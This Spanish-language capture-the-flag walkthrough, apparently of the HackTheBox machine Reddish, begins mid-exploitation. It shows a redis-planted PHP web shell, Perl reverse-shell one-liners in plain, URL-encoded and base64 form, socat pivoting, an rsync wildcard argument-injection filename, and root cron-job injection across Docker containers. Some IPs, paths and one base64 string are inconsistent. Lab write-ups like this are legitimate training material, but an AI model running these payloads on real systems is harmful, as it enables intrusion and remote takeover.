cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 save

~~~

Ejecutamos el script para que se encargue de subir `cmd.php` al servidor a través de `redis` de forma automática

~~~ bash
./redis_abuse.sh                 
OK
OK
OK
~~~


## Pivoting to `www`

Nuestra IP no es alcanzable desde esta nueva máquina, necesitaremos utilizar el túnel que establecimos con `chisel`, sin embargo, para poder establecer una reverse shell necesitamos que `172.19.0.3` conozca un camino hasta nuestra IP.

> Reenviaremos todo el tráfico entrante desde el puerto `1111` de este contenedor a nuestra IP por el puerto `2222` con la ayuda de `socat`
{: .notice--info}

~~~ bash
root@nodered:/tmp# ./socat TCP-LISTEN:1111,fork TCP10.10.14.12:2222 &
~~~

El mapeo de la red con esta nueva conexión se vería más o menos de la siguiente manera

~~~ bash
1. [+] Host 172.20.0.3 172.19.0.3 <-- www -> 172.19.0.4:1111 (Reverse Shell) 
2. [+] Host 172.18.0.4 172.19.0.4 <-- nodered :1111 -> 10.10.14.12:2222 (Socat)
~~~ 

## Shell as `www-data` - `www`

Utilizaremos `perl` para enviar una reverse shell como lo hicimos con el primer contenedor, pero enviando la conexión al contenedor en vez de nosotros directamente

~~~ bash
perl -e 'use Socket;$i="172.19.0.4";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Enviaremos la reverse shell codificada en URL en el parámetro `id` a la IP `172.19.0.4`, quien está redirigiendo el tráfico por el puerto `1111` a nuestro puerto `2222` de nuestra IP

~~~ bash
perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D1111%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22sh%20-i%22%29%3B%7D%3B%27
~~~

Una vez ejecutamos la solicitud, recibiremos la conexión correctamente y ganaremos acceso

~~~ bash
nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 46532
sh: 0: can't access tty; job control turned off
$  
~~~

También podemos hacerlo mediante el comando `curl` si quieres enviar la solicitud por consola

~~~ bash
proxychains -q curl -s 'http://172.19.0.3/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D1111%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22sh%20-i%22%29%3B%7D%3B%27'
~~~


## TTY Treatment - `www`

Haremos un tratamiento de la `tty` para poder tener una consola interactiva

~~~ bash
$ script /dev/null -c bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ ^Z
[1]  + 74901 suspended  nc -lvnp 2222
root@parrot reddish # stty raw -echo; fg
[1]  + 74901 continued  nc -lvnp 2222
                                     reset xterm
~~~

Asignaremos el valor a la variable `TERM` y ajustaremos las proporciones de la terminal

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ export TERM=xterm
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ stty rows 44 columns 184
~~~
<br>


# Escalada de Privilegios - `www`
---
Estamos dentro de la máquina, por el hostname veremos que se llama `www`. Si listamos las IP que tiene asignadas, podemos ver que posee dos direcciones IP

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ hostname -I
172.20.0.3 172.19.0.3 
~~~


## Monitoring Processes

Intentaremos identificar procesos que se ejecuten en el sistema en tiempo real gracias al siguiente script en bash

> `procmon.sh`

~~~ bash
cat -p procmon.sh     
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done
~~~

Podemos aprovechar que tenemos una consola para pegar el contenido de este script en una cadena en `base64` y guardarlo dentro de un archivo con el mismo nombre en la máquina víctima  

~~~ bash
cat procmon.sh | base64 -w 0 | xclip -sel clip 
~~~

Ahora en la máquina `www`, decodificamos el contenido del script y le asignamos permisos de ejecución

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ echo IyEvYmluL2Jhc2gKCm9sZF9wcm9jZXNzPSQocHMgLWVvIGNvbW1hbmQpCgp3aGlsZSB0cnVlOyBkbwoJbmV3X3Byb2Nlc3M9JChwcyAtZW8gY29tbWFuZCkKCWRpZmYgPChlY2hvICIkb2xkX3Byb2Nlc3MiKSA8KGVjaG8gIiRuZXdfcHJvY2VzcyIpIHwgZ3JlcCAiW1w+XDxdIiB8IGdyZXAgLXYgInByb2Ntb24uc2giIHwgZ3JlcCAtdiAiY29tbWFuZCIKCW9sZF9wcm9jZXNzPSRuZXdfcHJvY2Vzcwpkb25lCg== | base64 -d > /tmp/procmon.sh

chmod +x /tmp/procmon.sh
~~~

Ejecutaremos el script para detectar nuevos comandos que se ejecutan en el sistema

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ /tmp/procmon.sh 
> /usr/sbin/CRON
> /bin/sh -c sh /backup/backup.sh
> /bin/sh -c sh /backup/backup.sh
> sh /backup/backup.sh
> rsync -a *.rdb rsync://backup:873/src/rdb/
< /bin/sh -c sh /backup/backup.sh
< rsync -a *.rdb rsync://backup:873/src/rdb/
> rsync -a rsync://backup:873/src/backup/ /var/www/html/
> rsync -a rsync://backup:873/src/backup/ /var/www/html/
< rsync -a rsync://backup:873/src/backup/ /var/www/html/
< /bin/sh -c sh /backup/backup.sh
< sh /backup/backup.sh
< rsync -a rsync://backup:873/src/backup/ /var/www/html/
> /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root
< /usr/sbin/CRON
< /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root
> /usr/sbin/exim4 -Mc 1uDDv3-00074Y-Rf
> /usr/sbin/exim4 -Mc 1uDDv3-00074Y-Rf
> [exim4] <defunct>
< /usr/sbin/exim4 -Mc 1uDDv3-00074Y-Rf
< /usr/sbin/exim4 -Mc 1uDDv3-00074Y-Rf
< [exim4] <defunct>
~~~

Podemos ver que se ejecuta un script de bash llamado `backup.sh`, y luego una serie de instrucciones de `rsync`, que muy posiblemente tengan como origin el script

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ cat /backup/backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
~~~

En el script se utiliza el comando `rsync` para cargar cualquier archivo con extensión `.rdb` en un directorio `/src/rdb` correspondiente a un host `backup` por el puerto `873`. Si intentamos usar ping para ver qué dirección IP corresponde a ese host, no podremos debido a limitación de permisos

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ which ping | xargs ls -l
-rwxr-xr-x 1 root root 44104 Nov  8  2014 /bin/ping
~~~


## Abusing Wildcard Filename - `rsync`

Somos propietarios del directorio `f187a0ec71ce99642e4f0afbd441a68b`, y el script recoge archivos del mismo

~~~ bash
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$ ls -la ..
total 28
drwxr-xr-x 5 root     root     4096 Jul 15  2018 .
drwxr-xr-x 1 root     root     4096 Jul 15  2018 ..
drwxr-xr-x 3 root     root     4096 Jul 15  2018 8924d0549008565c554f8128cd11fda4
drwxr-xr-x 2 root     root     4096 Jul 15  2018 assets
drwxr-xr-x 2 www-data www-data 4096 Jul 15  2018 f187a0ec71ce99642e4f0afbd441a68b
-rw-r--r-- 1 root     root     2023 May  4  2018 index.html
-rw-r--r-- 1 root     root       17 May  4  2018 info.php
~~~

Sabiendo que tenemos capacidad de escritura, podemos crear un archivo malicioso que se encargue de ejecutar un comando a través de la herramienta `rsync` haciendo uso del parámetro `-e`, tal como se muestra en el siguiente artículo de `GTFOBins`

- https://gtfobins.github.io/gtfobins/rsync/

~~~
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
~~~

La idea sería llegar a ejecutar un archivo que contenga instrucciones en `bash`, en este caso, enviaremos una shell, pero que será `root` quien ejecute la instrucción.

Crearemos el siguiente archivo

> `reverse.rdb`

~~~ bash
cat reverse.rdb -p 

perl -e 'use Socket;$i="172.19.0.4";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

### Proof of Concept

Como no se está validando el nombre de archivo porque se usa un asterisco (`*`) para autocompletarlo, podemos enviar un nombre que contenga el parámetro y ejecute el otro archivo que creamos

~~~ bash
rsync -e bin sh reverse.rdb
~~~

Copiamos el contenido del archivo y lo almacenamos en la `clipboard`

~~~ bash
cat reverse.rdb | base64 -w 0 | xclip -sel clip
~~~

En la máquina víctima decodificamos la cadena en `base64` y la guardamos en el archivo `reverse.rdb` 

~~~ bash
bash-4.3$ cd ../f187a0ec71ce99642e4f0afbd441a68b/
bash-4.3$ echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9MTExMjtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > reverse.rdb
bash-4.3$ touch -- '-e sh reverse.rdb'
bash-4.3$ ls
-e sh reverse.rdb  reverse.rdb
~~~~

Al cabo de unos momentos deberíamos ganar acceso como el usuario `root` a la máquina `www`

~~~ bash
nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.10.94] 44572
/bin/sh: 0: can\'t access tty; job control turned off
# id	
uid=0(root) gid=0(root) groups=0(root)
~~~


## TTY Treatment

Haremos nuevamente un tratamiento de la `tty` para tener una consola interactiva

~~~ bash
# script /dev/null -c bash
root@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b# ^Z
[1]  + 157072 suspended  nc -lvnp 2222
root@parrot exploits # stty raw -echo; fg
[1]  + 157072 continued  nc -lvnp 2222
                                      reset xterm
~~~

Retocaremos la variable `TERM` y las proporciones de la terminal

~~~ bash
root@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b# export TERM=xterm
root@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b# stty rows 44 columns 184
~~~

En este punto podemos ver la flag del usuario no privilegiado, que se ubica en el directorio `/home/somaro`

~~~ bash
bash-4.3# cat somaro/user.txt 
e41...
~~~
<br>


# Reconocimiento - `backup`
---
Recordemos que tenemos asignada una nueva IP (`172.20.0.3`)

~~~ bash
root@www:/tmp# hostname -I 
172.19.0.3 172.20.0.3
~~~

Con los privilegios actuales, podemos hacer uso del comando `ping` para identificar el host `backup` que posiblemente esté dentro del segmento `172.20.0.0/16`

~~~ bash
root@www:/tmp# ping -c1 backup
PING backup (172.20.0.2) 56(84) bytes of data.
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.047 ms

--- backup ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.047/0.047/0.047/0.000 ms
~~~


## Ports Scanning

Identificaremos puertos abiertos utilizando el script `port_scanner.sh` que utilizamos en la máquina `nodered` a la IP de `backup`

~~~ bash
root@www:/tmp# echo '172.20.0.2' > host.txt
root@www:/tmp# ./port_scanner.sh host.txt 

Scanning hosts(s) from: (host.txt)
	[+] Port 873/open on host 172.20.0.2
~~~

Lógicamente vemos el puerto `873` abierto, que es el puerto por el cual se envían los archivos `.rdb` con el script en `/backup/backup.sh`

Actualicemos el mapeo de las redes internas para no confundirnos

~~~ bash
[+] Host 172.18.0.1 is up!
        [+] Port 1880/open

[+] Host 172.19.0.1 is up!
[+] Host 172.19.0.2 is up!
    [+] Port 6379/open

[+] Host 172.19.0.3 172.20.0.3 is up! <-- www (ACTUAL) -> 172.19.0.3:1111 (Reverse Shell)
	[+] Port 80/open
[+] Host 172.18.0.2 172.19.0.4 is up! <-- nodered :1111 -> 10.10.14.12:2222 (Socat)
[+] Host 172.20.0.2 is up! <-- backup
    [+] Port 873/open
~~~
<br>


# Intrusión / Explotación - `backup`
---
## Abusing `rsync`

>Rsync es una **herramienta de línea de comandos para la sincronización de archivos y directorios, tanto local como remota**, que permite transferir datos de forma eficiente y rápida.
{: .notice--info}

Podemos cargar archivos de la máquina `backup` mediante el uso de `rsync`, que es la función principal de `rsync`

~~~ bash
root@www:/tmp# rsync rsync://backup/src/etc/hosts hosts

root@www:/tmp# cat hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.2	backup
~~~

### Understanding `cron` Jobs

`cron` es un programa que nos permite ejecutar tareas de acuerdo a intervalos regulares de tiempo. Su sintaxis se define de la siguiente manera

~~~ text
*    *    *    *    *   /home/user/bin/script.sh
|    |    |    |    |            |
|    |    |    |    |    Command or Script to execute
|    |    |    |    |
|    |    |    |    Día de la semana(0-6 | Sun-Sat)
|    |    |    |
|    |    |    Mes (1-12)
|    |    |
|    |    Día del mes (1-31)
|    |
|    Hora (0-23)
|
Minuto (0-59)
~~~ 


## Abusing `cron` Jobs

Podemos utilizar `rsync` para ver tareas `cron` configuradas dentro del directorio `/etc/cron.d/`

~~~ bash
root@www:/tmp# rsync rsync://backup/src/etc/cron.d/ 
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
~~~

Vemos que existe una tarea `clean`, podemos intentar inyectar una nueva tarea que se ejecute cada minuto con el usuario `root` que ejecute una `shell`

~~~ bash
root@www:/tmp# echo '* * * * * root sh /tmp/reverse.sh' > reverse
root@www:/tmp# rsync reverse rsync://backup/src/etc/cron.d/
~~~

Comprobaremos que se haya insertado nuestra tarea `cron` llamada `reverse`

~~~ bash
root@www:/tmp# rsync rsync://backup/src/etc/cron.d/
drwxr-xr-x          4,096 2025/05/10 19:19:15 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
-rw-r--r--             34 2025/05/10 19:19:15 reverse
~~~

Utilizaremos el `oneliner` en `perl` que nos envíe una consola a `172.20.0.3` para crear el archivo que ejecutará `root` en la tarea `cron`

~~~ bash
perl -e 'use Socket;$i="172.20.0.3";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Copiaremos el contenido del script en una cadena de `base64`

~~~ bash
cat reverse_perl_www_to_nodered | base64 -w 0 | xclip -sel clip
~~~

En el contenedor `www`, decodificamos y guardamos en un archivo `reverse.sh`

~~~ bash
root@www:/tmp# echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9MzMzMztzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > reverse.sh
~~~

Finalmente subiremos la reverse shell al directorio `/tmp/reverse.sh`

~~~ bash
root@www:/tmp# rsync reverse.sh rsync://backup/src/tmp/reverse.sh -v
reverse.sh

sent 312 bytes  received 41 bytes  706.00 bytes/sec
total size is 220  speedup is 0.62

# Validar el script
root@www:/tmp# rsync rsync://backup/src/tmp/reverse.sh
-rw-r--r--            220 2025/05/10 19:53:52 reverse.sh
~~~


## File Transfer - `socat`

En vez de abrir una nueva conexión con `socat` a nuestro puerto `80`. Aprovecharemos el reenvío de tráfico hacia nuestra máquina por el puerto `2222` para abrir un servidor HTTP

~~~ bash
python3 -m http.server 2222
Serving HTTP on 0.0.0.0 port 2222 (http://0.0.0.0:2222/) ...
~~~

Desde la máquina `www`, volveremos a definir la función `__curl` como lo hicimos en la máquina `nodered`

~~~ bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
~~~

Ahora podemos descargarnos `socat` en la máquina `www`. Haremos la solicitud a `172.19.0.4` (`nodered`) por el puerto `1111`

~~~ bash
root@www:/tmp# __curl http://172.19.0.4:1111/socat > socat

# Damos permisos de ejecución
root@www:/tmp# chmod +x socat
~~~


## Pivoting to `backup` 

Ahora reenviaremos la conexión desde un puerto local, por ejemplo el `3333` al contenedor `nodered` que ya tiene un túnel establecido con nuestra IP al puerto `2222`, de esta forma, cuando se ejecute la reverse shell, podremos recibirla desde nuestra máquina atacante

~~~ bash
root@www:/tmp# ./socat TCP-LISTEN:3333,fork TCP:172.19.0.4:1111 & 
[1] 16024
~~~

El flujo que queremos que tenga el tráfico se verá de la siguiente manera desde nuestro mapeo de red

~~~ bash
1. [+] Host 172.20.0.2 is up! <-- backup (Reverse Shell) -> 172.20.0.3:3333
2. [+] Host 172.20.0.3 is up! <-- www :3333 -> 172.19.0.4:1111 (Socat)
3. [+] Host 172.19.0.4 is up! <-- nodered :1111 -> 10.10.14.12:2222 (Socat)
~~~


## Shell as `root` - `backup`

Al cabo de unos momentos ganaremos acceso como `root` al contenedor `backup`

~~~ bash
nc -lvnp 2222                   
listening on [any] 2222 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 49108
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
~~~


## TTY Treatment

Haremos un nuevo tratamiento de la `tty` para hacer más interactiva esta consola, además asignaremos el valor `xterm` a la variable `TERM` y ajustaremos las proporciones de la terminal

~~~ bash
nc -lvnp 2222                   
listening on [any] 2222 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 49108
/bin/sh: 0: can\'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

root@backup:~# export TERM=xterm
root@backup:~# stty rows 44 columns 184
~~~
<br>


# Reconocimiento - `reddish`
---
## Disk Mount

Investigando los discos montados que posee el contendor `backup`, nos daremos cuenta que posee un disco `sda2`

~~~ bash
root@backup:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         5.3G  4.1G  1.2G  78% /
tmpfs            64M     0   64M   0% /dev
tmpfs           997M     0  997M   0% /sys/fs/cgroup
/dev/sda2       5.3G  4.1G  1.2G  78% /backup
shm              64M     0   64M   0% /dev/shm
~~~

Montaremos este disco en una carpeta que crearemos en un directorio, idealmente `tmp`

~~~ bash
root@backup:~# mount /dev/sda2 /tmp/sda2/
root@backup:~# cd /mnt/sda2/

root@backup:/mnt/sda2# ls
bin  boot  dev	etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt	proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
~~~

Tenemos un nuevo sistema de archivos, podemos ver la flag del usuario `root` en `root/root.txt`. Sin embargo, lo que buscamos es ganar acceso al sistema
<br>


# Intrusión / Explotación - `reddish`
---
## Abusing `cron` Jobs

Como este nuevo sistema de archivos está sincronizado con la máquina real (`reddish`), inyectaremos una tarea `cron` al igual que en `backup` para enviarnos una reverse shell

~~~ bash
root@backup:/mnt/sda2/etc/cron.d# echo '* * * * * root sh /tmp/reverse.sh' > reverse_job
~~~

Utilizaremos el `oneliner` de `perl` enviando la shell a nuestra IP por un puerto, recordemos que tenemos comunicación directa con `reddish`

~~~ bash
cat reverse_perl

perl -e 'use Socket;$i="10.10.14.169";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Copiaremos el script en una cadena codificada en `base64` para depositarla en el contenedor `backup`

~~~ bash
cat reverse_perl | base64 -w 0 | xclip -sel clip
~~~

Nos dirigiremos a `/mnt/sda2/tmp` y crearemos el script que envíe la reverse shell a nuestra IP

~~~ bash
root@backup:/mnt/sda2/etc/cron.d# cd ../../tmp

root@backup:/mnt/sda2/tmp# echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMTY5IjskcD00NDM7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo= | base64 -d > reverse.sh
~~~


## Root Time

Pondremos el puerto que seleccionamos a la escucha, al cabo de unos momentos deberíamos ganar acceso a la máquina `reddish` como `root` :0

~~~ bash
nc -lvnp 443     
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 44906
/bin/sh: 0: can't access tty; job control turned off
# id        
uid=0(root) gid=0(root) groups=0(root)
# hostname
reddish
~~~


## TTY Treatment

Haremos el último tratamiento de la TTY para operar con la shell de `reddish` de forma más cómoda

~~~ bash
# script /dev/null -c bash
Script started, file is /dev/null
root@reddish:~# ^Z
[1]  + 313937 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo; fg  
[1]  + 313937 continued  nc -lvnp 443
                                     reset xterm

root@reddish:~# export TERM=xterm
root@reddish:~# stty rows 44 columns 184
~~~

Ahora ya podemos ver la flag en el directorio `root`

~~~ bash
root@reddish:~# cat root.txt 
0bd...
~~~


<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Wisdom begins in wonder.
> — Socrates
{: .notice--info}
